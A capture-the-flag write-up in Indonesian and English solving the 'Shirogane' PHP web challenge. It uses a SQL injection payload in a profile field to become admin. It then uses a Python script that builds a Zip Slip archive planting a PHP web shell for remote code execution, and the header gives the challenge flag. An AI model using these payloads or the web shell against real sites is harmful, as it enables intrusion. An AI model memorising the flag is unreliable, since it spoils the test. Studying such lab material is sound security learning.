---
slug: "web-shirogane"
title: "Shirogane"
competition: "PlayITPlus"
category: "Web"
difficulty: "Easy"
date: "2026-11-08"
updated: "2026-11-09"
summary: "A whiteboxed web exploit challenge. But there’s two steps: 1. SQL Injection to get Admin 2. Zip Slip to get RCE"
tags: ["SQLI","ZIP SLIP","RCE","PHP"]
status: "published"
flag: "PLAYITPLUS{904af8d2487a0dc563af637b879ead350c8a4c75e3dc736057fba35ca2a44db2}"
attachments: []
source: "https://claritys.web.id/writeups/web-shirogane"
---

# Shirogane

> A whiteboxed web exploit challenge. But there’s two steps:  1. SQL Injection to get Admin  2. Zip Slip to get RCE

## TL;DR

A whiteboxed web exploit challenge. But there’s two steps:

1.  `SQL Injection` to get `Admin`
    
2.  `Zip Slip` to get `RCE`
    

### AI

-   [https://chat.deepseek.com/share/fde2anjc20urpgdedh](https://chat.deepseek.com/share/fde2anjc20urpgdedh)0
    

## Challenge

-   **Poin / solves:** **460 / 15**
    
-   **Desc:**
    
    -   A boutique film studio ships its gallery CMS. The darkroom is only one request away.
        
-   Whitebox
    

## Recon

Kita diberikan source code yang basisnya PHP dan menggunakan Apache.

```bash

~/ctf/playit/web/shirogane/instance
❯ tree                                                                          󰥔 16:58:55
.
├── db
│   └── schema.sql
├── docker-compose.yml
└── web
    ├── apache
    │   └── shirogane.conf
    ├── app
    │   ├── bootstrap.php
    │   ├── config.php
    │   ├── controllers
    │   │   ├── account.php
    │   │   ├── admin.php
    │   │   ├── auth.php
    │   │   └── pages.php
    │   ├── database.php
    │   ├── helpers.php
    │   ├── scripts
    │   │   └── install.php
    │   ├── session.php
    │   ├── view.php
    │   └── views
    │       ├── account.php
    │       ├── admin_dashboard.php
    │       ├── admin_import.php
    │       ├── error.php
    │       ├── gallery.php
    │       ├── home.php
    │       ├── layout.php
    │       ├── login.php
    │       └── register.php
    ├── Dockerfile
    ├── entrypoint.sh
    └── public
        ├── assets
        │   ├── app.css
        │   ├── app.js
        │   └── fonts
        │       ├── archivo-400.woff2
        │       ├── archivo-500.woff2
        │       ├── archivo-600.woff2
        │       ├── archivo-700.woff2
        │       └── archivo-800.woff2
        ├── galleries
        │   ├── harbor-fog
        │   │   ├── 01-pier.webp
        │   │   ├── 02-mooring-rope.webp
        │   │   ├── 03-fishing-boat.webp
        │   │   ├── 04-fisherman.webp
        │   │   ├── 05-warehouse.webp
        │   │   └── gallery.json
        │   └── night-shift
        │       ├── 01-loading-dock.webp
        │       ├── 02-rainy-alley.webp
        │       ├── 03-workers-hands.webp
        │       ├── 04-freight-train.webp
        │       └── gallery.json
        └── index.php

14 directories, 44 files
```

Kita mulai dari `app/` terlebih dahulu ngeliat filenya.

```bash
~/ctf/playit/web/shirogane/instance/web/app
❯ cat config.php                                                                󰥔 17:00:01
<?php

function config(): array
{
    static $config = null;
    if ($config !== null) {
        return $config;
    }

    $root = dirname(__DIR__);

    $config = [
        'app_root' => $root,
        'public_root' => $root . '/public',
        'galleries_dir' => $root . '/public/galleries',
        'views_dir' => __DIR__ . '/views',
        'db' => [
            'host' => getenv('DB_HOST') ?: 'db',
            'port' => (int) (getenv('DB_PORT') ?: 3306),
            'name' => getenv('DB_NAME') ?: 'shirogane',
            'user' => getenv('DB_USER') ?: 'shirogane',
            'pass' => getenv('DB_PASS') ?: 'shirogane',
        ],
        'admin' => [
            'username' => getenv('ADMIN_USERNAME') ?: 'admin',
            'password' => getenv('ADMIN_PASSWORD') ?: 'shirogane-admin',
        ],
    ];

    return $config;
}
```

Okay keliatan normal, kita perlu catat `galleries_dir`nya.

```bash
~/ctf/playit/web/shirogane/instance/web
❯ cat app/session.php                                                                                                                                                         󰥔 18:36:35
<?php

function start_session(): void
{
    if (session_status() === PHP_SESSION_NONE) {
        session_name('shirogane');
        session_start();
    }
}

function current_user(): ?array
{
    if (empty($_SESSION['user_id'])) {
        return null;
    }

    $stmt = db()->prepare('SELECT id, username, display_name, bio, role FROM users WHERE id = ?');
    $stmt->bind_param('i', $_SESSION['user_id']);
    $stmt->execute();
    $user = $stmt->get_result()->fetch_assoc();

    return $user ?: null;
}

function login_user(array $user): void
{
    session_regenerate_id(true);
    $_SESSION['user_id'] = (int) $user['id'];
}

function logout_user(): void
{
    $_SESSION = [];
    session_destroy();
}

function require_login(): array
{
    $user = current_user();
    if ($user === null) {
        redirect('/login');
    }

    return $user;
}

function require_admin(): array
{
    $user = require_login();
    if ($user['role'] !== 'admin') {
        http_response_code(403);
        render('error', ['title' => 'Forbidden', 'message' => 'This darkroom is reserved for studio administrators.']);
        exit;
    }

    return $user;
}
```

Dari file tersebut, kita bisa ngelihat kalau kita harus ngeganti `role` menjadi `admin` biar bisa ngeakses banyak hal (function `require_admin`).

Baru sekarang kita ngelihat `controllers/` untuk mencari vulnerability si web ini.

## Vulnerability

```bash
~/ctf/playit/web/shirogane/instance/web/app
❯ cat controllers/account.php                                                                                                                                                 󰥔 18:08:25
<?php

function account_show(): void
{
    $user = require_login();
    render('account', ['user' => $user]);
}

function account_update(): void
{
    $user = require_login();
    verify_csrf();

    $displayName = $_POST['display_name'] ?? '';
    $bio = $_POST['bio'] ?? '';

    $sql = "UPDATE users SET display_name = '$displayName', bio = '$bio' WHERE id = " . $user['id'];
    db()->query($sql);

    flash('Your profile has been updated.');
    redirect('/account');
}
```

Dapat dilihat di situ kalau ada vulnerability SQL Injection. Karena php akan selalu tetap mengevaluasi variable `$displayName`, `$bio`, dan `$user['id']` sebelum mengirimkan query sql tersebut ke database. Karena dia memakai tanda petik dua `"`, jadinya kita bisa ngeinject query SQL tersebut.

Tetapi biar bisa interaksi sama vuln itu kita harus sudah login, jadi kita register akun baru terlebih dahulu setelah itu kita bisa lakuin exploitnya.

Kita register di endpoint `/register` terlebih dahulu, nanti ke redirect ke halaman update (`controllers/auth.php`).

![image.png](/assets/uploads/9517698c-f88d-42ae-a49d-ce42eb1d4923-image.png)

Okay sekarang kita sudah masuk ke endpoint `/account`, yang di mana di endpoint itulah ada vulnerability SQL Injection karena kita ngeupdate profile kita.

![image.png](/assets/uploads/cfcd6dbb-bc88-4fd1-bbb6-986067371a47-image-1.png)

Looking back again at the query:

```
$sql = "UPDATE users SET display_name = '$displayName', bio = '$bio' WHERE id = " . $user['id'];
```

It’s not sanitized, so we can input single quote to exploit this query. We can create the exploit like this for the `bio parameter`:

```
', role='admin
```

Kita pencet `save profile` terus kita modified requestnya menggunakan `Burpsuite`. Kita tambahkan payload kita tadi di parameter `bio`. (the host changed because i forgot to extend the duration tehee 🦉)

![image.png](/assets/uploads/a04ea2d4-24e1-4b29-8858-d7585e86a5ad-image-2.png)

Then we got then admin 💛

![image.png](/assets/uploads/eba38d8c-9889-4d24-9fbc-c394810ef22e-image-3.png)

How the payload works?

1.  The single quote and comma diawal `',`
    
    Menjadikan `query`nya menjadi seperti ini:
    
    ```
    $sql = "UPDATE users SET display_name = '$displayName', bio = '', ' WHERE id = " . $user['id'];
    ```
    
    Menjadikan bio itu stop disitu dan kita bisa menambahkan additional query that seharusnya tidak bisa. Kita bisa menambahkan seperti `role=` atau column yang lainnya ada di databasenya setelah koma.
    
2.  `role='admin`
    
    Ngejadiin `query`nya jadi:
    
    ```
    $sql = "UPDATE users SET display_name = '$displayName', bio = '', role='admin' WHERE id = " . $user['id'];
    ```
    
    So technically kita ngeubah role kita menjadi `admin` yang di mana seharusnya ini tidak bisa karena tidak ada di query, tapi SQL Injection merubah intended programnya.
    

Setelah kita dapet akses jadi admin, kita buka opsi **Darkroom** yang di mana setelah kalian buka dia akan ngarahin kita ke endpoint `/admin`.

![image.png](/assets/uploads/6f3091f6-614b-42c3-b0e8-e5fa63cba37c-image-4.png)

As we can see too, di situ ada import a roll. Jadi ini bisa aja stage 2 untuk ngeupload file.

![image.png](/assets/uploads/c648dfe3-d2f8-49f9-9b90-29d89588b4f9-image-5.png)

Turns out ternyata benar, di sini ada upload sebuah attachment. Sekarang kita lihat code dibalik ini.

```bash
~/ctf/playit/web/shirogane/instance/web
❯ cat app/controllers/admin.php                                                                                                                                               󰥔 18:38:02
<?php

function admin_dashboard(): void
{
    $user = require_admin();
    render('admin_dashboard', ['user' => $user, 'galleries' => galleries()]);
}

function admin_import_show(): void
{
    require_admin();
    render('admin_import', []);
}

function admin_import_submit(): void
{
    require_admin();
    verify_csrf();

    $file = $_FILES['archive'] ?? null;
    if ($file === null || $file['error'] !== UPLOAD_ERR_OK) {
        render('admin_import', ['error' => 'Choose a .zip archive to import.']);
        return;
    }

    if (strtolower(pathinfo($file['name'], PATHINFO_EXTENSION)) !== 'zip') {
        render('admin_import', ['error' => 'Only .zip archives are accepted.']);
        return;
    }

    $zip = new ZipArchive();
    if ($zip->open($file['tmp_name']) !== true) {
        render('admin_import', ['error' => 'That archive could not be opened.']);
        return;
    }

    $target = config()['galleries_dir'] . '/import_' . bin2hex(random_bytes(4));
    mkdir($target, 0775, true);

    $imported = 0;
    for ($i = 0; $i < $zip->numFiles; $i++) {
        $name = $zip->getNameIndex($i);
        if (substr($name, -1) === '/') {
            continue;
        }

        $destination = $target . '/' . $name;
        @mkdir(dirname($destination), 0775, true);
        file_put_contents($destination, $zip->getFromIndex($i));
        $imported++;
    }
    $zip->close();

    flash('Imported ' . $imported . ' files into a new gallery.');
    redirect('/admin');
}
```

Dapat kita lihat kalau di sini ada kerentanan `Directory Traversal`, yang di mana ini dinamakan vulnerability `Zip Slip`. How? Karena tidak ada sanitasi input seperti `../` for a bare minimum.

Kita juga dapat melihat juga kalau dia itu juga ngasih permissionnya itu executable, jadi kita bisa inject file .php baru yang di mana leads us to `Remote Code Execution` (`RCE`).

Jadi sebagai contoh kita bisa memasukkan file `exploit.php` yang di mana dia ngejalanin shell terus kita bisa akses file tersebut karena `Directory Traversal`, jadi kita taruh file `exploit.php` di `public/` dengan cara `../../`. Karena by default dia dismpan di `/public/galleries/import_<randomhex>`.

```
        @mkdir(dirname($destination), 0775, true);
```

[https://github.com/ptoomey3/evilarc](https://github.com/ptoomey3/evilarc)

Kalau kita pakai itu kita tinggal jalanin:

```
python evilarc.py -f exploit.zip -o unix -p "shell.php" -d 2 payload.php
```

Yang di mana:

💡

-   `-f`: Nama file ZIP hasil.
    
-   `-d 2`: Jumlah kedalaman `../` (For our case kita butuh: `../../` makanya kita kasih 2).
    
-   `payload.php`: File lokal yang berisi skrip PHP kita.
    

Terus isi `payload.php`\-nya adalah:

```php
<?php system($_REQUEST[0]); ?>
```

Aku dapet referensinya dari sini (dulu sempet ngerjain, jadinya masih inget):

[academy.hackthebox.com](https://academy.hackthebox.com/app/module/33/section/793)

Sebenarnya kita bisa ngerakit file `.zip`nya menggunakan tools itu tetapi karena aku terlalu malas menanggapi ya kita lempar AI aja 🥶.

Kita bisa menggunakan script ini untuk ngecreate file exploitnya:

```python
import zipfile

# Nama file ZIP yang akan kamu upload
zip_name = "exploit.zip"

# Payload PHP yang akan dieksekusi
# Menggunakan $_REQUEST[0] sesuai referensi kamu
payload = "<?php system($_REQUEST[0]); ?>"

# Nama entri di dalam ZIP
# Kamu perlu menebak kedalaman folder import_<random>
# Contoh: jika folder import berada di /public/galleries/import_abc/
# dan kamu ingin menulis ke /public/shell.php, kamu butuh ../../shell.php
# Karena $target = /public/galleries/import_abc
# Maka $destination = /public/galleries/import_abc/../../shell.php = /public/shell.php
traversal_path = "../../shell.php"

# Membuat ZIP
with zipfile.ZipFile(zip_name, 'w') as zf:
    # writestr memungkinkan kita menentukan nama entri secara manual
    zf.writestr(traversal_path, payload)

print(f"File {zip_name} berhasil dibuat dengan entri: {traversal_path}")
```

![image.png](/assets/uploads/a1023e60-fd02-4656-8f8b-f616934738b5-image-6.png)

Oke sudah jadi file `exploit.zip`nya. Sekarang kita bisa upload file itu di `/admin/import`.

![image.png](/assets/uploads/01513f5c-2272-41b2-b28d-39569ae0c470-image-7.png)

Jika sudah, sekarang kita akses file tersebut sesuai nama dan parameter yang tadi kita masukkan.

![image.png](/assets/uploads/6d70fa20-0acb-4778-8e02-6cd22ecf91fc-a0a3c637-9fa7-43d8-8cb8-e6c629364476.png)

Just like that, we got RCE. Now let’s open the flag that located at `/`.

![image.png](/assets/uploads/698e7fe2-7f72-44fe-a6d7-b2542ca91361-image-8.png)

Now we open the flag:

![image.png](/assets/uploads/7cf7a9ca-ef0c-4ab1-8194-3666729fa48a-image-9.png)

Dapet deh, tapi flagnya beda karena ini recreate. Originalnya itu ini:

![image.png](/assets/uploads/a0d08951-b8fb-422d-8b87-149f2154b52a-image-10.png)
